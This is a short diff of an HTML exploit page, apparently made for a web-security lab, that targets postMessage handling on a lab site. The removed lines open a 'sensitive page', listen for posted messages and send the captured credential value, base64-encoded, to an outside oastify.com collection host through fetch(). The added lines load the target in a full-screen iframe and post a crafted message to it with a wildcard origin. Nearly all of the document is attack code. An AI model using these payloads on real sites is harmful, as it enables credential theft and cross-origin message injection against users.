@@ -6,19 +6,29 @@
   <title>Document</title>
  </head>
  <body>
-  <script>
+  <style>
+    .fullscreen-iframe {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+        z-index: 9999; /* optional: make sure it's on top */
+    }
+</style>
 
-      //Open The Sensitive Page !
-      let x = window.open("https://ptl-26f4decbb5d9-46d07f2427f4.libcurl.me/key/0");
+<iframe id="myFrame" class="fullscreen-iframe" src="https://ptl-490b624e468d-250574a8e55a.libcurl.me/"></iframe>
 
-     //Listen for Credintials!
 
-     window.addEventListener("message", (event) => {
-      
-      fetch("https://i5ov0popau5sdw0mlxuluou3dujl7bv0.oastify.com/?"+btoa(event.data.value));
-     });
+<script>
+let iframe = document.getElementById("myFrame");
+
+        iframe.onload = () => {
+            iframe.contentWindow.postMessage("user=test&id=0", "*");
+        };
     </script>
+
  </body>
  </html>
-\
 
